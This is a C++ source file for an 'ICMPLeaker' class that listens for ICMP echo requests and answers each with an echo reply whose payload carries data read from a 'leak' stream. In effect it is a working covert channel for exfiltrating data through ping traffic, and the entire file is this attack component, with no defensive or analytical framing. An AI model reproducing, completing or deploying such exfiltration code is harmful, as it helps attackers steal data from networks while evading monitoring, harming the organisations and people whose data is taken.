#include "ICMPLeaker.h"
#include "ICMPMessage.h"
#include <stdio.h>
#include <errno.h>

ICMPLeaker::ICMPLeaker() : m_init(false) {}

bool ICMPLeaker::Init()
{
    m_init = m_socket.Init();
    return m_init;
}

bool ICMPLeaker::LeakData(IODataStream& leak_data_stream)
{
    if (!m_init)
    {
        printf("uninitialized\r\n");
        return false;
    }

    ICMPMessage request = {};
    ICMPMessage response = {};

    while (true)
    {
        if (!m_socket.Receive(request))
        {
            printf("receive failed %d\r\n", errno);
            return false;
        }

        if (!CreateResponse(leak_data_stream, request, response))
        {
            printf("creating response failed\r\n");
            return false;
        }

        if (!m_socket.Send(response))
        {
            printf("send failed %d\r\n", errno);
            return false;
        }
    }

    return true;
}

bool ICMPLeaker::CreateResponse(IODataStream& leak_data_stream, ICMPMessage& request, ICMPMessage& response)
{
    response.type = 0;
    response.code = 0;
    response.content = request.content;

    if (!leak_data_stream.Read(response.payload, sizeof(response.payload)))
    {
        printf("reading data from leaker failed\r\n");
        return false;
    }

    response.CalculateChecksum();
    return true;
}